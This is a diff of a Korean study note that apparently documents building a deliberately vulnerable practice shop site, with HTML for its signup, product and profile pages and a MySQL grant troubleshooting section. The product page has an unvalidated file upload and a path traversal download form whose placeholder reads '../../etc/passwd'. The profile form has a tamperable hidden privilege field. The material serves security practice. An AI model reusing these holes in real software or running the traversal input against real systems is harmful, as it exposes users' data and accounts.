+      &lt;p&gt;회원 전용 특가, 무료 배송,&lt;br&gt;신상품 우선 알림 서비스를 제공합니다.&lt;/p&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;auth-side__footer&quot;&gt;© 2025 SHOPD Inc. All rights reserved.&lt;/div&gt;
+  &lt;/aside&gt;
+
+  &lt;!-- 오른쪽 회원가입 폼 --&gt;
+  &lt;main class=&quot;auth-main&quot;&gt;
+    &lt;div class=&quot;auth-box&quot;&gt;
+      &lt;div class=&quot;auth-box__header&quot;&gt;
+        &lt;h1&gt;계정 만들기&lt;/h1&gt;
+        &lt;p&gt;몇 가지 정보만 입력하면 바로 시작할 수 있습니다&lt;/p&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 서버 에러 (register.jsp 에서 ?error=1 리다이렉트 시 표시) --&gt;
+      &lt;div id=&quot;server-error&quot; class=&quot;alert alert-error&quot; style=&quot;display:none;&quot;&gt;
+        &lt;svg width=&quot;16&quot; height=&quot;16&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+          &lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;
+          &lt;line x1=&quot;12&quot; y1=&quot;8&quot; x2=&quot;12&quot; y2=&quot;12&quot;/&gt;
+          &lt;line x1=&quot;12&quot; y1=&quot;16&quot; x2=&quot;12.01&quot; y2=&quot;16&quot;/&gt;
+        &lt;/svg&gt;
+        이미 사용 중인 아이디입니다.
+      &lt;/div&gt;
+
+      &lt;form action=&quot;register.jsp&quot; method=&quot;post&quot; onsubmit=&quot;return validateForm()&quot;&gt;
+        &lt;div class=&quot;form-group&quot;&gt;
+          &lt;label for=&quot;uname&quot;&gt;아이디&lt;/label&gt;
+          &lt;input type=&quot;text&quot; id=&quot;uname&quot; name=&quot;uname&quot;
+                 placeholder=&quot;사용할 아이디를 입력하세요&quot; required autocomplete=&quot;username&quot; /&gt;
+        &lt;/div&gt;
+
+        &lt;div class=&quot;form-group&quot;&gt;
+          &lt;label for=&quot;passwd&quot;&gt;
+            비밀번호
+          &lt;/label&gt;
+          &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;passwd&quot;
+                 placeholder=&quot;비밀번호를 입력하세요&quot; required autocomplete=&quot;new-password&quot;
+                 oninput=&quot;updateStrength()&quot; /&gt;
+          &lt;div class=&quot;strength-wrap&quot;&gt;
+            &lt;div class=&quot;strength-bar&quot;&gt;
+              &lt;div class=&quot;strength-bar__fill&quot; id=&quot;strength-fill&quot;&gt;&lt;/div&gt;
+            &lt;/div&gt;
+            &lt;p class=&quot;strength-hint&quot; id=&quot;strength-hint&quot;&gt;&lt;/p&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;div class=&quot;form-group&quot;&gt;
+          &lt;label for=&quot;profile&quot;&gt;
+            프로필 소개
+            &lt;span style=&quot;color:var(--text-muted); font-size:11px; font-weight:400;&quot;&gt;(선택)&lt;/span&gt;
+          &lt;/label&gt;
+          &lt;input type=&quot;text&quot; id=&quot;profile&quot; name=&quot;profile&quot;
+                 placeholder=&quot;간단한 자기소개를 입력하세요&quot; /&gt;
+        &lt;/div&gt;
+
+        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot; style=&quot;margin-top:8px;&quot;&gt;
+          가입 완료
+          &lt;svg width=&quot;15&quot; height=&quot;15&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2.5&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+            &lt;path d=&quot;M5 12h14M12 5l7 7-7 7&quot;/&gt;
+          &lt;/svg&gt;
+        &lt;/button&gt;
+      &lt;/form&gt;
+
+      &lt;div class=&quot;link-row&quot;&gt;
+        이미 계정이 있으신가요? &lt;a href=&quot;login.html&quot;&gt;로그인&lt;/a&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/main&gt;
+
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;                            
+</code></pre>
+</li>
+</ul>
+<h5>product</h5>
+<ul>
+<li>product.html<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;상품 · SHOPD&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/product.css&quot; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;shop-layout&quot;&gt;
+
+  &lt;!-- 헤더 --&gt;
+  &lt;header class=&quot;shop-header&quot;&gt;
+    &lt;a href=&quot;product.html&quot; class=&quot;shop-header__brand&quot;&gt;
+      &lt;div class=&quot;brand-icon&quot;&gt;🛍&lt;/div&gt;
+      SHOPD
+    &lt;/a&gt;
+    &lt;nav class=&quot;shop-header__nav&quot;&gt;
+      &lt;span id=&quot;admin-badge&quot; class=&quot;admin-badge&quot; style=&quot;display:none;&quot;&gt;
+        &lt;svg width=&quot;11&quot; height=&quot;11&quot; fill=&quot;currentColor&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+          &lt;path d=&quot;M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z&quot;/&gt;
+        &lt;/svg&gt;
+        관리자
+      &lt;/span&gt;
+      &lt;span id=&quot;username-display&quot; class=&quot;nav-btn&quot; style=&quot;color:var(--text-muted); cursor:default;&quot;&gt;&lt;/span&gt;
+      &lt;a href=&quot;mypage.html&quot; class=&quot;nav-btn&quot;&gt;내 정보&lt;/a&gt;
+      &lt;a href=&quot;login.html&quot; class=&quot;nav-btn&quot;&gt;로그아웃&lt;/a&gt;
+    &lt;/nav&gt;
+  &lt;/header&gt;
+
+  &lt;!-- 메인 --&gt;
+  &lt;main class=&quot;shop-main&quot;&gt;
+
+    &lt;!-- 페이지 헤더 --&gt;
+    &lt;div class=&quot;page-header&quot;&gt;
+      &lt;div class=&quot;page-header__top&quot;&gt;
+        &lt;h1 id=&quot;page-title&quot;&gt;상품 목록&lt;/h1&gt;
+      &lt;/div&gt;
+      &lt;p id=&quot;page-desc&quot;&gt;엄선된 프리미엄 상품들을 만나보세요.&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;!-- 상품 그리드 --&gt;
+    &lt;div class=&quot;product-grid&quot; id=&quot;product-grid&quot;&gt;
+      &lt;!-- 스켈레톤 로더 --&gt;
+      &lt;div class=&quot;skeleton-card&quot;&gt;
+        &lt;div class=&quot;skeleton skeleton-thumb&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;skeleton skeleton-line&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;skeleton skeleton-line short&quot;&gt;&lt;/div&gt;
+      &lt;/div&gt;
+      &lt;div class=&quot;skeleton-card&quot;&gt;
+        &lt;div class=&quot;skeleton skeleton-thumb&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;skeleton skeleton-line&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;skeleton skeleton-line short&quot;&gt;&lt;/div&gt;
+      &lt;/div&gt;
+      &lt;div class=&quot;skeleton-card&quot;&gt;
+        &lt;div class=&quot;skeleton skeleton-thumb&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;skeleton skeleton-line&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;skeleton skeleton-line short&quot;&gt;&lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- 관리자 전용 섹션 (JS로 표시/숨김) --&gt;
+    &lt;div id=&quot;admin-section&quot; style=&quot;display:none;&quot;&gt;
+
+      &lt;!-- 상품 등록 --&gt;
+      &lt;div class=&quot;section&quot;&gt;
+        &lt;div class=&quot;section__header&quot;&gt;
+          &lt;div class=&quot;section__title&quot;&gt;
+            &lt;div class=&quot;section__title-icon&quot;&gt;📦&lt;/div&gt;
+            상품 등록
+          &lt;/div&gt;
+          &lt;span class=&quot;section__desc&quot;&gt;⚠️ 파일 형식 검증 없음&lt;/span&gt;
+        &lt;/div&gt;
+
+        &lt;form action=&quot;product_upload.jsp&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+          &lt;div class=&quot;form-grid-2&quot;&gt;
+            &lt;div class=&quot;form-group&quot;&gt;
+              &lt;label&gt;상품명&lt;/label&gt;
+              &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;상품 이름을 입력하세요&quot; required /&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;form-group&quot;&gt;
+              &lt;label&gt;가격 (원)&lt;/label&gt;
+              &lt;input type=&quot;number&quot; name=&quot;price&quot; placeholder=&quot;0&quot; required /&gt;
+            &lt;/div&gt;
+          &lt;/div&gt;
+          &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label&gt;상품 설명&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;description&quot; placeholder=&quot;간단한 상품 설명&quot; /&gt;
+          &lt;/div&gt;
+          &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label&gt;상품 이미지&lt;/label&gt;
+            &lt;div class=&quot;dropzone&quot; id=&quot;dropzone&quot;&gt;
+              &lt;input type=&quot;file&quot; name=&quot;imageFile&quot; id=&quot;fileInput&quot; onchange=&quot;onFileChange(this)&quot; /&gt;
+              &lt;div class=&quot;dropzone__icon&quot;&gt;📁&lt;/div&gt;
+              &lt;p class=&quot;dropzone__text&quot;&gt;&lt;strong&gt;클릭&lt;/strong&gt;하거나 파일을 드래그하세요&lt;/p&gt;
+              &lt;p class=&quot;dropzone__hint&quot;&gt;모든 파일 형식 허용 (확장자 검증 없음)&lt;/p&gt;
+              &lt;p class=&quot;dropzone__filename&quot; id=&quot;file-name&quot;&gt;&lt;/p&gt;
+            &lt;/div&gt;
+          &lt;/div&gt;
+          &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot; style=&quot;max-width:180px;&quot;&gt;
+            상품 등록
+            &lt;svg width=&quot;14&quot; height=&quot;14&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2.5&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+              &lt;path d=&quot;M5 12h14M12 5l7 7-7 7&quot;/&gt;
+            &lt;/svg&gt;
+          &lt;/button&gt;
+        &lt;/form&gt;
+      &lt;/div&gt;
+
+      &lt;!-- 파일 다운로드 --&gt;
+      &lt;div class=&quot;section&quot;&gt;
+        &lt;div class=&quot;section__header&quot;&gt;
+          &lt;div class=&quot;section__title&quot;&gt;
+            &lt;div class=&quot;section__title-icon&quot;&gt;⬇️&lt;/div&gt;
+            파일 다운로드
+          &lt;/div&gt;
+          &lt;span class=&quot;section__desc&quot;&gt;⚠️ Path Traversal 취약점 포함&lt;/span&gt;
+        &lt;/div&gt;
+        &lt;form action=&quot;product_download.jsp&quot; method=&quot;get&quot; class=&quot;form-inline&quot;&gt;
+          &lt;div class=&quot;form-group&quot;&gt;
+            &lt;label&gt;파일명&lt;/label&gt;
+            &lt;input type=&quot;text&quot; name=&quot;filename&quot; placeholder=&quot;예: laptop.jpg 또는 ../../etc/passwd&quot; /&gt;
+          &lt;/div&gt;
+          &lt;button type=&quot;submit&quot; class=&quot;btn btn-outline&quot;&gt;다운로드&lt;/button&gt;
+        &lt;/form&gt;
+      &lt;/div&gt;
+
+    &lt;/div&gt;
+    &lt;!-- 관리자 섹션 끝 --&gt;
+
+  &lt;/main&gt;
+
+  &lt;footer class=&quot;shop-footer&quot;&gt;© 2025 SHOPD Inc. All rights reserved.&lt;/footer&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+  // ── 세션 정보 확인 (check_session.jsp 에서 JSON으로 받아옴)
+  fetch(&quot;check_session.jsp&quot;)
+    .then(r =&gt; r.json())
+    .then(data =&gt; {
+      if (!data.loggedIn) {
+        location.href = &quot;login.html&quot;;
+        return;
+      }
+      const isAdmin = data.priority === 0;
+
+      // 헤더 사용자명 표시
+      document.getElementById(&quot;username-display&quot;).textContent = data.uname;
+
+      // 관리자 배지 &amp; 섹션
+      if (isAdmin) {
+        document.getElementById(&quot;admin-badge&quot;).style.display  = &quot;inline-flex&quot;;
+        document.getElementById(&quot;admin-section&quot;).style.display = &quot;block&quot;;
+        document.getElementById(&quot;page-title&quot;).textContent = &quot;상품 관리&quot;;
+        document.getElementById(&quot;page-desc&quot;).textContent  = &quot;상품을 등록하고 파일을 관리하세요.&quot;;
+      }
+    })
+    .catch(() =&gt; { location.href = &quot;login.html&quot;; });
+
+  // ── 상품 목록 로드
+  fetch(&quot;product_list.jsp&quot;)
+    .then(r =&gt; r.text())
+    .then(html =&gt; {
+      const grid = document.getElementById(&quot;product-grid&quot;);
+      grid.innerHTML = html || `
+        &lt;div class=&quot;empty-state&quot;&gt;
+          &lt;div class=&quot;empty-state__icon&quot;&gt;📦&lt;/div&gt;
+          &lt;p&gt;등록된 상품이 없습니다&lt;/p&gt;
+        &lt;/div&gt;`;
+    })
+    .catch(() =&gt; {
+      document.getElementById(&quot;product-grid&quot;).innerHTML =
+        '&lt;div class=&quot;empty-state&quot;&gt;&lt;div class=&quot;empty-state__icon&quot;&gt;⚠️&lt;/div&gt;&lt;p&gt;상품을 불러오지 못했습니다.&lt;/p&gt;&lt;/div&gt;';
+    });
+
+  // ── 파일 드롭존
+  function onFileChange(input) {
+    document.getElementById(&quot;file-name&quot;).textContent =
+      input.files[0] ? input.files[0].name : &quot;&quot;;
+  }
+  const dz = document.getElementById(&quot;dropzone&quot;);
+  if (dz) {
+    dz.addEventListener(&quot;dragover&quot;,  e =&gt; { e.preventDefault(); dz.classList.add(&quot;drag-over&quot;); });
+    dz.addEventListener(&quot;dragleave&quot;, () =&gt; dz.classList.remove(&quot;drag-over&quot;));
+    dz.addEventListener(&quot;drop&quot;,      () =&gt; dz.classList.remove(&quot;drag-over&quot;));
+  }
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;              
+</code></pre>
+</li>
+</ul>
+<h5>mypage</h5>
+<ul>
+<li>mypage.html<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;ko&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot; /&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+  &lt;title&gt;내 정보 · SHOPD&lt;/title&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/common.css&quot; /&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/product.css&quot; /&gt;
+  &lt;script&gt;
+    window.addEventListener('DOMContentLoaded', () =&gt; {
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('success') === '1') {
+        document.getElementById(&quot;success-msg&quot;).style.display = &quot;flex&quot;;
+      }
+      if (params.get('error') === '1') {
+        document.getElementById(&quot;error-msg&quot;).style.display = &quot;flex&quot;;
+      }
+    });
+  &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;header class=&quot;shop-header&quot;&gt;
+  &lt;a href=&quot;product.html&quot; class=&quot;shop-header__brand&quot;&gt;
+    &lt;div class=&quot;brand-icon&quot;&gt;🛍&lt;/div&gt;
+    SHOPD
+  &lt;/a&gt;
+  &lt;nav class=&quot;shop-header__nav&quot;&gt;
+    &lt;a href=&quot;product.html&quot; class=&quot;nav-btn&quot;&gt;← 상품으로&lt;/a&gt;
+    &lt;a href=&quot;login.html&quot; class=&quot;nav-btn&quot;&gt;로그아웃&lt;/a&gt;
+  &lt;/nav&gt;
+&lt;/header&gt;
+
+&lt;div class=&quot;mypage-wrap&quot;&gt;
+  &lt;h2 style=&quot;font-size:22px; font-weight:600; letter-spacing:-0.5px; margin-bottom:28px;&quot;&gt;내 정보 수정&lt;/h2&gt;
+
+  &lt;!-- 알림 --&gt;
+  &lt;div id=&quot;success-msg&quot; class=&quot;alert alert-success&quot; style=&quot;display:none;&quot;&gt;
+    &lt;svg width=&quot;16&quot; height=&quot;16&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+      &lt;path d=&quot;M22 11.08V12a10 10 0 1 1-5.93-9.14&quot;/&gt;&lt;polyline points=&quot;22 4 12 14.01 9 11.01&quot;/&gt;
+    &lt;/svg&gt;
+    정보가 성공적으로 수정되었습니다.
+  &lt;/div&gt;
+  &lt;div id=&quot;error-msg&quot; class=&quot;alert alert-error&quot; style=&quot;display:none;&quot;&gt;
+    &lt;svg width=&quot;16&quot; height=&quot;16&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; viewBox=&quot;0 0 24 24&quot;&gt;
+      &lt;circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;10&quot;/&gt;
+      &lt;line x1=&quot;12&quot; y1=&quot;8&quot; x2=&quot;12&quot; y2=&quot;12&quot;/&gt;
+      &lt;line x1=&quot;12&quot; y1=&quot;16&quot; x2=&quot;12.01&quot; y2=&quot;16&quot;/&gt;
+    &lt;/svg&gt;
+    오류가 발생했습니다. 다시 시도해주세요.
+  &lt;/div&gt;
+
+  &lt;div class=&quot;section&quot;&gt;
+    &lt;div class=&quot;section__header&quot;&gt;
+      &lt;div class=&quot;section__title&quot;&gt;
+        &lt;div class=&quot;section__title-icon&quot;&gt;✏️&lt;/div&gt;
+        정보 수정
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;form action=&quot;mypage.jsp&quot; method=&quot;post&quot;&gt;
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label for=&quot;passwd&quot;&gt;새 비밀번호&lt;/label&gt;
+        &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;passwd&quot;
+               placeholder=&quot;변경할 비밀번호를 입력하세요&quot; autocomplete=&quot;new-password&quot; /&gt;
+      &lt;/div&gt;
+      &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label for=&quot;profile&quot;&gt;프로필 소개&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;profile&quot; name=&quot;profile&quot;
+               placeholder=&quot;간단한 자기소개&quot; /&gt;
+      &lt;/div&gt;
+
+      &lt;!-- ⚠️ 취약점: priority를 hidden 필드로 전송 → 클라이언트에서 값 조작 가능 --&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;priority&quot; value=&quot;9&quot; /&gt;
+
+      &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;저장하기&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+
+  &lt;!-- 위험 구역 --&gt;
+  &lt;div class=&quot;danger-zone&quot;&gt;
+    &lt;p class=&quot;danger-zone__title&quot;&gt;계정 삭제&lt;/p&gt;
+    &lt;p class=&quot;danger-zone__desc&quot;&gt;탈퇴 시 모든 데이터가 영구적으로 삭제되며 복구할 수 없습니다.&lt;/p&gt;
+    &lt;a href=&quot;delete.jsp&quot;&gt;
+      &lt;button type=&quot;button&quot; class=&quot;btn btn-danger&quot;&gt;회원 탈퇴&lt;/button&gt;
+    &lt;/a&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</li>
+</ul>
+<h3>🛠️트러블슈팅</h3>
+<h4>DB 권한 문제</h4>
+<ul>
+<li>초기 유저 설정: <code>GRANT ALL PRIVILEGES ON shopdb.* TO 'shopuser'@'172.16.10.101';</code>
+<ul>
+<li>이렇게 하면 당연히 tomcat 서버에서 접근이 불가능함</li>
+<li>유저 정보 확인: <code>SELECT user, host FROM mysql.user WHERE user='shopuser';</code>
+<img src="/assets/imgs/notes/server-build-practice/64-image-62.png" alt="image.png" loading="lazy"></li>
+</ul>
+</li>
+<li>유저 권한 재설정
+<img src="/assets/imgs/notes/server-build-practice/65-image-63.png" alt="image.png" loading="lazy"></li>
+</ul>
